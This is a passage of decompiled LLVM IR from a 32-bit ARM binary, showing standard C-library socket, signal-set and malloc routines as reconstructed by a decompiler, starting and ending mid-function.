  %v3_13c0c = add i32 %v4_13c04, %v0_13c00
  %v4_13c0c = inttoptr i32 %v3_13c0c to i32*
  store i32 %v1_13c08, i32* %v4_13c0c, align 4
  %v2_13c14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c14

dec_label_pc_13c14:                               ; preds = %entry, %dec_label_pc_13bfc
  %v1_13c18 = phi i32 [ %v0_13bec, %entry ], [ -1, %dec_label_pc_13bfc ]
  %v2_13c14 = phi i32 [ %v3_13be0, %entry ], [ %v2_13c14.pre, %dec_label_pc_13bfc ]
  store i32 %v2_13c14, i32* @r7, align 4
  ret i32 %v1_13c18

; uselistorder directives
  uselistorder i32 %v0_13bec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c14, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c1c:
  %v0_13c1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c1c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13c1c
  %v2_13c20 = load i32, i32* @r4, align 4
  %v5_13c20 = sdiv i32 %v2_13c20, 131072
  %v6_13c20 = and i32 %v5_13c20, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13c1c, %bb
  %v7_13c20 = phi i32 [ %arg1, %dec_label_pc_13c1c ], [ %v6_13c20, %bb ]
  ret i32 %v7_13c20

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13c28 = load i32, i32* @r4, align 4
  store i32 %v3_13c28, i32* %stack_var_-24, align 4
  %v6_13c28 = load i32, i32* @r5, align 4
  %v9_13c28 = load i32, i32* @r6, align 4
  %v12_13c28 = load i32, i32* @r7, align 4
  %v15_13c28 = load i32, i32* @r8, align 4
  %v18_13c28 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @ip, align 4
  %v4_13c34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_13c38 = icmp eq i32 %v4_13c34, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_13c38, label %dec_label_pc_13c50, label %entry.dec_label_pc_13c58_crit_edge

entry.dec_label_pc_13c58_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13c58

dec_label_pc_13c50:                               ; preds = %entry
  store i32 %v3_13c28, i32* @r4, align 4
  store i32 %v9_13c28, i32* @r6, align 4
  store i32 %v12_13c28, i32* @r7, align 4
  store i32 %v15_13c28, i32* @r8, align 4
  %v0_13c54 = call i32 @__sys_send()
  br label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %entry.dec_label_pc_13c58_crit_edge, %dec_label_pc_13c50
  %v0_13c58 = call i32 @__libc_enable_asynccancel()
  %v0_13c5c = load i32, i32* @r6, align 4
  store i32 %v0_13c5c, i32* @r1, align 4
  store i32 %v0_13c58, i32* @r5, align 4
  %v0_13c68 = load i32, i32* @r8, align 4
  store i32 %v0_13c68, i32* @r3, align 4
  %v0_13c6c = load i32, i32* @r4, align 4
  store i32 %v0_13c6c, i32* @r0, align 4
  %v0_13c70 = call i32 @__sys_send()
  store i32 %v0_13c70, i32* @r4, align 4
  %v0_13c78 = load i32, i32* @r5, align 4
  %v1_13c7c = call i32 @__libc_disable_asynccancel(i32 %v0_13c78)
  %v0_13c80 = load i32, i32* @r4, align 4
  %v2_13c84 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13c84, i32* @r4, align 4
  store i32 %v6_13c28, i32* @r5, align 4
  store i32 %v9_13c28, i32* @r6, align 4
  store i32 %v12_13c28, i32* @r7, align 4
  store i32 %v15_13c28, i32* @r8, align 4
  store i32 %v18_13c28, i32* @lr, align 4
  ret i32 %v0_13c80

; uselistorder directives
  uselistorder label %dec_label_pc_13c58, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13c94 = load i32, i32* @r4, align 4
  store i32 %v3_13c94, i32* %stack_var_-16, align 4
  %v0_13ca8 = load i32, i32* @r0, align 4
  store i32 %v0_13ca8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13ca8, -4095
  br i1 %tmp, label %dec_label_pc_13cd0, label %dec_label_pc_13cb8

dec_label_pc_13cb8:                               ; preds = %entry
  %v0_13cbc = call i32 @__aeabi_read_tp()
  %v3_13cc0 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13cc0 = sext i16 %v3_13cc0 to i32
  %v0_13cc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13cc4 = sub i32 0, %v0_13cc4
  store i32 %v1_13cc4, i32* %r2.global-to-local, align 4
  %v3_13cc8 = add i32 %v4_13cc0, %v0_13cbc
  %v4_13cc8 = inttoptr i32 %v3_13cc8 to i32*
  store i32 %v1_13cc4, i32* %v4_13cc8, align 4
  %v2_13cd0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13cd0

dec_label_pc_13cd0:                               ; preds = %entry, %dec_label_pc_13cb8
  %v1_13cd4 = phi i32 [ %v0_13ca8, %entry ], [ -1, %dec_label_pc_13cb8 ]
  %v2_13cd0 = phi i32 [ %v3_13c94, %entry ], [ %v2_13cd0.pre, %dec_label_pc_13cb8 ]
  store i32 %v2_13cd0, i32* @r4, align 4
  ret i32 %v1_13cd4

; uselistorder directives
  uselistorder i32 %v0_13ca8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cd0, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13cd8:
  %v0_13cd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13cd8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13cd8
  %v2_13cdc = load i32, i32* @r8, align 4
  %v5_13cdc = mul i32 %v2_13cdc, 65536
  %v6_13cdc = and i32 %v5_13cdc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13cd8, %bb
  %v7_13cdc = phi i32 [ %arg1, %dec_label_pc_13cd8 ], [ %v6_13cdc, %bb ]
  ret i32 %v7_13cdc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13ce0 = load i32, i32* @r4, align 4
  store i32 %v3_13ce0, i32* %stack_var_-32, align 4
  %v6_13ce0 = load i32, i32* @r5, align 4
  %v9_13ce0 = load i32, i32* @r6, align 4
  %v12_13ce0 = load i32, i32* @r7, align 4
  %v15_13ce0 = load i32, i32* @r8, align 4
  %v18_13ce0 = load i32, i32* @sb, align 4
  %v21_13ce0 = load i32, i32* @sl, align 4
  %v24_13ce0 = load i32, i32* @lr, align 4
  %v4_13cf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_13cf8 = icmp eq i32 %v4_13cf0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_13cf8, label %dec_label_pc_13d18, label %dec_label_pc_13d24

dec_label_pc_13d18:                               ; preds = %entry
  store i32 %v3_13ce0, i32* @r4, align 4
  store i32 %v12_13ce0, i32* @r7, align 4
  store i32 %v15_13ce0, i32* @r8, align 4
  store i32 %v18_13ce0, i32* %sb.global-to-local, align 4
  %v0_13d20 = call i32 @__sys_sendto()
  br label %dec_label_pc_13d24

dec_label_pc_13d24:                               ; preds = %entry, %dec_label_pc_13d18
  %v0_13d24 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13d24, i32* @r5, align 4
  %v0_13d38 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13d38, i32* @r0, align 4
  %v0_13d40 = call i32 @__sys_sendto()
  store i32 %v0_13d40, i32* @r4, align 4
  %v0_13d48 = load i32, i32* @r5, align 4
  %v1_13d4c = call i32 @__libc_disable_asynccancel(i32 %v0_13d48)
  %v0_13d50 = load i32, i32* @r4, align 4
  %v2_13d58 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13d58, i32* @r4, align 4
  store i32 %v6_13ce0, i32* @r5, align 4
  store i32 %v9_13ce0, i32* @r6, align 4
  store i32 %v12_13ce0, i32* @r7, align 4
  store i32 %v15_13ce0, i32* @r8, align 4
  store i32 %v18_13ce0, i32* @sb, align 4
  store i32 %v21_13ce0, i32* @sl, align 4
  store i32 %v24_13ce0, i32* @lr, align 4
  ret i32 %v0_13d50

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13d68 = load i32, i32* @r4, align 4
  store i32 %v3_13d68, i32* %stack_var_-12, align 4
  %v0_13d78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13d78, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13d78, -4095
  br i1 %tmp, label %dec_label_pc_13da0, label %dec_label_pc_13d88

dec_label_pc_13d88:                               ; preds = %entry
  %v0_13d8c = call i32 @__aeabi_read_tp()
  %v3_13d90 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13d90 = sext i16 %v3_13d90 to i32
  store i32 %v4_13d90, i32* @r3, align 4
  %v0_13d94 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d94 = sub i32 0, %v0_13d94
  store i32 %v1_13d94, i32* %r2.global-to-local, align 4
  %v3_13d98 = add i32 %v4_13d90, %v0_13d8c
  %v4_13d98 = inttoptr i32 %v3_13d98 to i32*
  store i32 %v1_13d94, i32* %v4_13d98, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13da0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %entry, %dec_label_pc_13d88
  %v1_13da4 = phi i32 [ %v0_13d78, %entry ], [ -1, %dec_label_pc_13d88 ]
  %v2_13da0 = phi i32 [ %v3_13d68, %entry ], [ %v2_13da0.pre, %dec_label_pc_13d88 ]
  store i32 %v2_13da0, i32* @r4, align 4
  ret i32 %v1_13da4

; uselistorder directives
  uselistorder i32 %v0_13d78, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13da0, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13da8:
  %v0_13da8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13da8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13da8
  %v2_13dac = load i32, i32* @r8, align 4
  %v3_13dac = load i32, i32* @r7, align 4
  %v8_13dac = lshr i32 %v2_13dac, %v3_13dac
  %v9_13dac = and i32 %v8_13dac, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13da8, %bb
  %v10_13dac = phi i32 [ %arg1, %dec_label_pc_13da8 ], [ %v9_13dac, %bb ]
  ret i32 %v10_13dac

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13db0 = load i32, i32* @r7, align 4
  store i32 %v3_13db0, i32* %stack_var_-8, align 4
  %v0_13dbc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13dbc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13dbc, -4095
  br i1 %tmp, label %dec_label_pc_13de4, label %dec_label_pc_13dcc

dec_label_pc_13dcc:                               ; preds = %entry
  %v0_13dd0 = call i32 @__aeabi_read_tp()
  %v3_13dd4 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13dd4 = sext i16 %v3_13dd4 to i32
  store i32 %v4_13dd4, i32* @r3, align 4
  %v0_13dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13dd8 = sub i32 0, %v0_13dd8
  store i32 %v1_13dd8, i32* %r2.global-to-local, align 4
  %v3_13ddc = add i32 %v4_13dd4, %v0_13dd0
  %v4_13ddc = inttoptr i32 %v3_13ddc to i32*
  store i32 %v1_13dd8, i32* %v4_13ddc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13de4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13de4

dec_label_pc_13de4:                               ; preds = %entry, %dec_label_pc_13dcc
  %v1_13de8 = phi i32 [ %v0_13dbc, %entry ], [ -1, %dec_label_pc_13dcc ]
  %v2_13de4 = phi i32 [ %v3_13db0, %entry ], [ %v2_13de4.pre, %dec_label_pc_13dcc ]
  store i32 %v2_13de4, i32* @r7, align 4
  ret i32 %v1_13de8

; uselistorder directives
  uselistorder i32 %v0_13dbc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13de4, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_13dec:
  %v0_13dec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13dec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13dec
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_13dec = load i32, i32* @sb, align 4
  %v8_13dec = shl i32 %v2_13dec, %tmp
  %v9_13dec = and i32 %v8_13dec, %arg1
  store i32 %v9_13dec, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13dec, %bb
  %v8_13df0 = phi i32 [ %arg1, %dec_label_pc_13dec ], [ %v9_13dec, %bb ]
  ret i32 %v8_13df0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_13e0c, label %dec_label_pc_13e04

dec_label_pc_13e04:                               ; preds = %entry
  %v7_13e08 = icmp slt i32 %arg2, 65
  br i1 %v7_13e08, label %dec_label_pc_13e28, label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13e04, %entry
  %v0_13e10 = call i32 @__aeabi_read_tp()
  %v3_13e14 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13e14 = sext i16 %v3_13e14 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13e20 = add i32 %v4_13e14, %v0_13e10
  %v4_13e20 = inttoptr i32 %v3_13e20 to i32*
  store i32 22, i32* %v4_13e20, align 4
  %v0_13e30.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e30

dec_label_pc_13e28:                               ; preds = %dec_label_pc_13e04
  %v0_13e28 = call i32 @__sigaddset()
  store i32 %v0_13e28, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e30

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e0c, %dec_label_pc_13e28
  %v0_13e30 = phi i32 [ %v0_13e30.pre, %dec_label_pc_13e0c ], [ %v0_13e28, %dec_label_pc_13e28 ]
  ret i32 %v0_13e30

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e30, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_13e4c = add i32 %tmp, 4
  %v3_13e4c = inttoptr i32 %v2_13e4c to i32*
  store i32 0, i32* %v3_13e4c, align 4
  %v1_13e50 = load i32, i32* %r3.global-to-local, align 4
  %v2_13e50 = inttoptr i32 %v1_13e50 to i32*
  store i32 0, i32* %v2_13e50, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13e58 = load i32, i32* @r4, align 4
  store i32 %v3_13e58, i32* %stack_var_-16, align 4
  %v6_13e58 = load i32, i32* @r5, align 4
  %v9_13e58 = load i32, i32* @r6, align 4
  %v7_13e60 = icmp eq i32 %arg2, -1
  br i1 %v7_13e60, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_13e68 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_13e84

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_13e8c

dec_label_pc_13e84:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r6, align 4
  %v7_13e88 = icmp slt i32 %arg1, 65
  br i1 %v7_13e88, label %dec_label_pc_13ea8, label %dec_label_pc_13e8c

dec_label_pc_13e8c:                               ; preds = %.thread16, %dec_label_pc_13e84
  %v0_13e90 = call i32 @__aeabi_read_tp()
  %v3_13e94 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13e94 = sext i16 %v3_13e94 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13ea0 = add i32 %v4_13e94, %v0_13e90
  %v4_13ea0 = inttoptr i32 %v3_13ea0 to i32*
  store i32 22, i32* %v4_13ea0, align 4
  %v0_13f00.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e84
  %v2_13ea8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13ea8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13eb0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13eb0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_13ec0 = call i32 @__sigaddset()
  %v0_13ec8 = load i32, i32* @r5, align 4
  store i32 %v0_13ec8, i32* %r1.global-to-local, align 4
  %v0_13ecc = load i32, i32* @r6, align 4
  %v2_13ecc = add i32 %v0_13ecc, 12128
  %v2_13ed0 = call i32 @__GI___sigismember(i32 %v2_13ecc, i32 %v0_13ec8)
  store i32 %v2_13ea8, i32* %r1.global-to-local, align 4
  %v0_13ee4 = load i32, i32* @r5, align 4
  %v3_13ef0 = call i32 @__libc_sigaction(i32 %v0_13ee4, i32 %v2_13ea8, i32 %v2_13e68)
  %v1_13ef4 = icmp slt i32 %v3_13ef0, 0
  br i1 %v1_13ef4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13ea8
  %v5_13ef8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_13ef8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13ea8
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_13e8c, %bb32
  %v0_13f00 = phi i32 [ %v5_13ef8, %bb31 ], [ %v0_13f00.pre, %dec_label_pc_13e8c ], [ -1, %bb32 ]
  %v2_13f08 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13f08, i32* @r4, align 4
  store i32 %v6_13e58, i32* @r5, align 4
  store i32 %v9_13e58, i32* @r6, align 4
  ret i32 %v0_13f00

; uselistorder directives
  uselistorder i32 %v2_13ea8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e8c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13f1c = add i32 %arg2, -1
  %v3_13f20 = udiv i32 %v1_13f1c, 32
  %v4_13f24 = mul nuw nsw i32 %v3_13f20, 4
  %v5_13f24 = add i32 %v4_13f24, %arg1
  %v6_13f24 = inttoptr i32 %v5_13f24 to i32*
  %v7_13f24 = load i32, i32* %v6_13f24, align 4
  %v1_13f28 = urem i32 %v1_13f1c, 32
  %v7_13f30 = shl i32 1, %v1_13f28
  %v8_13f30 = and i32 %v7_13f24, %v7_13f30
  %v10_13f30 = icmp ne i32 %v8_13f30, 0
  %. = zext i1 %v10_13f30 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13f1c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_13f40 = load i32, i32* @r1, align 4
  %v1_13f40 = add i32 %v0_13f40, -1
  %v3_13f44 = udiv i32 %v1_13f40, 32
  %v0_13f48 = load i32, i32* @r0, align 4
  %v4_13f48 = mul nuw nsw i32 %v3_13f44, 4
  %v5_13f48 = add i32 %v0_13f48, %v4_13f48
  %v6_13f48 = inttoptr i32 %v5_13f48 to i32*
  %v7_13f48 = load i32, i32* %v6_13f48, align 4
  %v1_13f4c = urem i32 %v1_13f40, 32
  %v7_13f54 = shl i32 1, %v1_13f4c
  %v8_13f54 = or i32 %v7_13f48, %v7_13f54
  store i32 %v8_13f54, i32* %v6_13f48, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13f40, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13f64 = add i32 %arg2, -1
  %v3_13f68 = udiv i32 %v1_13f64, 32
  %v4_13f6c = mul nuw nsw i32 %v3_13f68, 4
  %v5_13f6c = add i32 %v4_13f6c, %arg1
  %v6_13f6c = inttoptr i32 %v5_13f6c to i32*
  %v7_13f6c = load i32, i32* %v6_13f6c, align 4
  %v1_13f70 = urem i32 %v1_13f64, 32
  %tmp = shl i32 -1, %v1_13f70
  %v8_13f78 = add i32 %tmp, -1
  %v9_13f78 = and i32 %v7_13f6c, %v8_13f78
  store i32 %v9_13f78, i32* %v6_13f6c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13f64, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_13f88 = udiv i32 %arg1, 256
  store i32 %v3_13f88, i32* %r1.global-to-local, align 4
  %v2_13f8c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_13f8c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_13f98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13f8c, i32 %v0_13f98)
  %v0_13f9c = load i32, i32* %r1.global-to-local, align 4
  %v1_13f9c = add i32 %v0_13f9c, 1048320
  %v3_13fa0 = udiv i32 %v1_13f9c, 65536
  %v1_13fa4 = and i32 %v3_13fa0, 8
  %v6_13fa8 = shl i32 %v0_13f9c, %v1_13fa4
  %v1_13fac = add i32 %v6_13fa8, 520192
  %v3_13fb0 = udiv i32 %v1_13fac, 65536
  %v1_13fb4 = and i32 %v3_13fb0, 4
  %v6_13fb8 = shl i32 %v6_13fa8, %v1_13fb4
  %v1_13fbc = add i32 %v6_13fb8, 245760
  %v3_13fc0 = udiv i32 %v1_13fbc, 65536
  %v1_13fc4 = and i32 %v3_13fc0, 2
  %v6_13fc8 = shl i32 %v6_13fb8, %v1_13fc4
  store i32 %v6_13fc8, i32* %r1.global-to-local, align 4
  %v1_13fcc = sub nsw i32 13, %v1_13fa4
  %v2_13fd0 = sub nsw i32 %v1_13fcc, %v1_13fb4
  %v3_13fd4 = udiv i32 %v6_13fc8, 32768
  %v4_13fd4 = sub nuw nsw i32 -1, %v3_13fd4
  %v4_13fd8 = udiv i32 %v6_13fc8, 16384
  %v5_13fd8 = and i32 %v4_13fd8, %v4_13fd4
  %v2_13fdc = sub nsw i32 %v2_13fd0, %v1_13fc4
  %v2_13fe0 = add nsw i32 %v2_13fdc, %v5_13fd8
  %v1_13fe4 = add nsw i32 %v2_13fe0, 6
  %v0_13fe8 = load i32, i32* %ip.global-to-local, align 4
  %v6_13fe8 = lshr i32 %v0_13fe8, %v1_13fe4
  %v3_13fec = mul nsw i32 %v2_13fe0, 4
  %v1_13ff0 = add nsw i32 %v3_13fec, 32
  %v1_13ff4 = urem i32 %v6_13fe8, 4
  %v2_13ff8 = or i32 %v1_13ff4, %v1_13ff0
  ret i32 %v2_13ff8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14000 = load i32, i32* @r4, align 4
  %v6_14000 = load i32, i32* @r5, align 4
  %v9_14000 = load i32, i32* @r6, align 4
  %v12_14000 = load i32, i32* @r7, align 4
  %v15_14000 = load i32, i32* @r8, align 4
  %v18_14000 = load i32, i32* @sb, align 4
  %v21_14000 = load i32, i32* @sl, align 4
  %v24_14000 = load i32, i32* @fp, align 4
  %v27_14000 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r1.global-to-local, align 4
  %v4_14014 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 108) to i32*), align 4
  store i32 %v4_14014, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_14020 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 68) to i32*), align 4
  store i32 %v4_14020, i32* %r1.global-to-local, align 4
  %v0_14024 = load i32, i32* @r0, align 4
  store i32 %v0_14024, i32* @r5, align 4
  store i32 %v4_14014, i32* %r2.global-to-local, align 4
  %v2_1402c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1402c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %ip.global-to-local, align 4
  %v4_14038 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  store i32 %v4_14038, i32* %ip.global-to-local, align 4
  store i32 81988, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14038)
  %v0_14044 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14044, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r1, align 4
  %v4_14050 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 16) to i32*), align 4
  store i32 %v4_14050, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1405c.855 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14050)
  %v0_1405c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1405c, -32
  br i1 %tmp, label %dec_label_pc_14080, label %dec_label_pc_14064

dec_label_pc_14064:                               ; preds = %entry
  store i32 66652, i32* %r2.global-to-local, align 4
  %v0_14068 = call i32 @__aeabi_read_tp()
  store i32 %v0_14068, i32* %r0.global-to-local, align 4
  %v3_1406c = load i16, i16* @global_var_244d0.762, align 2
  %v4_1406c = sext i16 %v3_1406c to i32
  store i32 %v4_1406c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14078 = add i32 %v4_1406c, %v0_14068
